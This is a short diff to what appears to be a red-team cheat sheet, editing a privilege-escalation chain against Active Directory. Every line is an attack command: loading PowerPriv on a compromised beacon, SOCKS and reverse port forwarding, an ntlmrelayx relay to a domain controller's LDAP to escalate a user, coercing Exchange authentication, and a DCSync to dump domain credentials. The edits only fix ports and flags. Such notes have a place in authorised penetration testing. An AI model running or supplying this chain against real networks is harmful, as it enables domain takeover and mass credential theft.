@@ -361,9 +361,9 @@ PrivEsc
     Download Poweshell PS1: https://github.com/G0ldenGunSec/PowerPriv
     Compromised Beacon: Powershell-Import /path/powerPriv.ps1
     Compromised Beacon: socks 36529
-    Compromised Beacon: rportfwd 80 127.0.0.1 80
+    Compromised Beacon: rportfwd 80 127.0.0.1 80 (or rportfwd 80 127.0.0.1 8080)
     Kali: Verify /etc/proxychains.conf port matches socks above
-    Kali: proxychains ntlmrelayx -t ldap://DC_IP --escalate-user username (-attackerPort 8080)
+    Kali: proxychains ntlmrelayx -t ldap://DC_IP --escalate-user username (--http-port 8080)
     Compromised Beacon: powershell PowerPriv -targetHost Exchange_IP -attackerHost Beacon_IP (may be internal IP)
     dcsync fqdn dom\user
    
